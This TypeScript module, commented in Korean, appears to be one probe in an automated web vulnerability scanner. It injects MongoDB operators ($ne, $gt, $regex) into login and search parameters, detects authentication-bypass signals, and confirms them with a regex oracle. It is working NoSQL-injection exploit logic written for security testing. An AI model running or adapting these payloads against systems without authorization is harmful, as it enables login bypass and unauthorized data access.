/**
 * nosql_probe — NoSQL 인젝션(연산자 주입) 탐지 + 실증.
 *
 * 쿼리/폼 파라미터에 MongoDB 스타일 연산자([$ne]/[$gt]/[$regex]) 변형을 넣어,
 * 서버가 이를 "조건"으로 해석해 응답이 달라지는지 관찰한다(로그인 엔드포인트 우선).
 *   - baseline(평문 값)과 응답이 다르고 인증 성공 지수(dashboard/welcome/admin/302→앱)가
 *     보이면 우회 신호. $regex 오라클(같은 파라미터 ^a vs ^zzz 응답 상이)로 실증 승격.
 *   - JSON POST 엔드포인트에는 {"param":{"$ne":""}} 바디로 동일 검사.
 *
 * FP 방어: baseline 과 동일하면 발견하지 않는다(배열 파라미터를 무시하는 서버 = 클린).
 * 상태 변경 없음(로그인 우회 관찰 전용, 실제 세션 획득은 하지 않는다).
 */

import type { Tool, ToolContext, ToolResult } from "../core/types.js";
import { authGet, authPost, baseUrl, joinPath, withQuery } from "./util.js";

const DEFAULT_PARAMS = ["user", "username", "email", "name", "login", "id", "q", "search", "pass", "password"];
const DEFAULT_PATHS = ["/"];
const MAX_PATHS = 8;
const MAX_PARAMS = 6;

/** 인증 성공 지수 — 로그인/접근 우회가 통과됐을 때 나올 법한 단어. */
const AUTH_SUCCESS = /(logout|dashboard|welcome|admin|panel|계정|관리자|마이페이지|내 정보|로그아웃)/i;
/** 로그인 화면으로 되돌리는 Location(우회 실패) 신호. */
const LOGIN_REDIRECT = /(login|signin|auth)/i;

interface OracleResult {
  method: string;
  changed: boolean;
  success: boolean;
}

function looksSuccess(res: { status: number; body: string; headers: Record<string, string> }): boolean {
  if (AUTH_SUCCESS.test(res.body)) return true;
  const loc = res.headers["location"] ?? res.headers["Location"] ?? "";
  if ((res.status === 302 || res.status === 303) && loc && !LOGIN_REDIRECT.test(loc)) return true;
  return false;
}

export const nosqlProbe: Tool = {
  name: "nosql_probe",
  description:
    "쿼리/폼/JSON 파라미터에 NoSQL 연산자([$ne]/[$gt]/[$regex])를 주입해 인증·검색 우회 신호를 탐지한다. $regex 오라클 확인 시 실증(high). 읽기/관찰 전용, 상태변경 없음.",
  intent: "exploit",
  async run(args, ctx: ToolContext): Promise<ToolResult> {
    const base = baseUrl(ctx.target);
    const paths = pickPaths(args);
    const params = pickParams(args);
    // 로그인 계열 경로를 먼저 스윕(우회 실증 확률이 높다).
    const loginish = paths.filter((p) => /(login|auth|signin|sign-in|account|session)/i.test(p));
    const ordered = [...new Set([...loginish, ...paths])].slice(0, MAX_PATHS);

    for (const path of ordered) {
      const ps = params.length ? params : DEFAULT_PARAMS;
      for (const param of ps.slice(0, MAX_PARAMS)) {
        // 1) baseline — 평문 값. 이와 동일하면 발견하지 않는다(FP 방어).
        let baseline;
        try {
          baseline = await authGet(ctx, joinPath(base, withQuery(path, { [param]: "x" })));
        } catch {
          continue;
        }
        if (baseline.status >= 500) continue;

        // 2) 연산자 주입 변형 — 응답 차등 + 인증 성공 지수 확인.
        const operators: Array<[string, string]> = [
          ["$ne", "x"],
          ["$gt", ""],
          ["$regex", "^a"],
        ];
        for (const [op, val] of operators) {
          let res;
          try {
            res = await authGet(ctx, joinPath(base, withQuery(path, { [`${param}[${op}]`]: val })));
          } catch {
            continue;
          }
          const changed = res.body !== baseline.body || res.status !== baseline.status;
          if (!changed) continue; // 서버가 연산자 파라미터를 무시 → 클린
          const success = looksSuccess(res);
          if (success) {
            const oracle = await regexOracle(ctx, base, path, param);
            const method = op === "$regex" ? "$regex" : "$ne";
            const technique = op === "$gt" ? "$gt" : method;
            return {
              ok: true,
              summary: `NoSQL 우회 신호: ${path} 의 '${param}' 연산자 주입(${technique})으로 응답 차등 + 인증 지수${oracle ? " + $regex 오라클 실증" : ""}`,
              fingerprint: { indicators: [`nosql ${path}?${param}`] },
              data: {
                severity: oracle ? "high" : "medium",
                title: `NoSQL Injection (param=${param})`,
                evidence:
                  `${path} — NoSQL 실증: $ne/$regex 우회로 인증 통과 (baseline 차등 + 성공 지수)` +
                  (oracle ? `; $regex 오라클: '^a' vs '^zzz' 응답 상이` : " (실증 미승격)"),
                param,
                oracle,
              },
            };
          }
        }

        // 3) JSON POST — {"param":{"$ne":""}} 변형(로그인 API 등).
        //    GET 으로 신호가 없었을 때만 시도해 중복 요청을 줄인다.
        const jsonOracle = await jsonPostOracle(ctx, base, path, param);
        if (jsonOracle) {
          return {
            ok: true,
            summary: `NoSQL 우회 신호(JSON POST): ${path} 의 '${param}' $ne 주입으로 인증 지수 확인 + $regex 오라클 실증`,
            fingerprint: { indicators: [`nosql ${path}?${param}`] },
            data: {
              severity: "high",
              title: `NoSQL Injection (param=${param})`,
              evidence: `${path} — NoSQL 실증: $ne/$regex 우회로 인증 통과 (baseline 차등 + 성공 지수, JSON POST)`,
              param,
              oracle: true,
            },
          };
        }
      }
    }
    return { ok: false, summary: `NoSQL 우회 미탐지 (paths=${ordered.join(",")}, params=${params.join(",")})` };
  },
};

/**
 * $regex 존재 오라클: 같은 파라미터에 ^a 와 ^zzz 두 요청을 보내 응답이 상이하면
 * 서버가 NoSQL 연산자를 실제로 평가한다는 실증. ^zzz 는 어떤 문서도 매칭하지 못한다.
 */
async function regexOracle(ctx: ToolContext, base: string, path: string, param: string): Promise<boolean> {
  try {
    const [a, z] = await Promise.all([
      authGet(ctx, joinPath(base, withQuery(path, { [`${param}[$regex]`]: "^a" }))),
      authGet(ctx, joinPath(base, withQuery(path, { [`${param}[$regex]`]: "^zzz" }))),
    ]);
    return (a.body !== z.body || a.status !== z.status) && looksSuccess(a);
  } catch {
    return false;
  }
}

/** JSON POST `{"param":{"$ne":""}}` → 성공 지수 확인 → $regex 오라클. */
async function jsonPostOracle(ctx: ToolContext, base: string, path: string, param: string): Promise<boolean> {
  try {
    const res = await authPost(ctx, joinPath(base, path), JSON.stringify({ [param]: { $ne: "" } }), {
      contentType: "application/json",
      cap: 6000,
    });
    if (!looksSuccess(res)) return false;
    const [a, z] = await Promise.all([
      authPost(ctx, joinPath(base, path), JSON.stringify({ [param]: { $regex: "^a" } }), { contentType: "application/json", cap: 6000 }),
      authPost(ctx, joinPath(base, path), JSON.stringify({ [param]: { $regex: "^zzz" } }), { contentType: "application/json", cap: 6000 }),
    ]);
    return (a.body !== z.body || a.status !== z.status) && looksSuccess(a);
  } catch {
    return false;
  }
}

function pickPaths(args: Record<string, unknown>): string[] {
  if (typeof args.path === "string" && args.path) return [args.path];
  if (Array.isArray(args.paths)) {
    const ps = args.paths.filter((x): x is string => typeof x === "string");
    if (ps.length) return [...new Set(ps)].slice(0, MAX_PATHS);
  }
  return DEFAULT_PATHS;
}

function pickParams(args: Record<string, unknown>): string[] {
  if (typeof args.param === "string" && args.param) return [args.param];
  if (Array.isArray(args.params)) {
    const ps = args.params.filter((x): x is string => typeof x === "string");
    if (ps.length) return [...new Set(ps)].slice(0, MAX_PARAMS);
  }
  return DEFAULT_PARAMS.slice(0, MAX_PARAMS);
}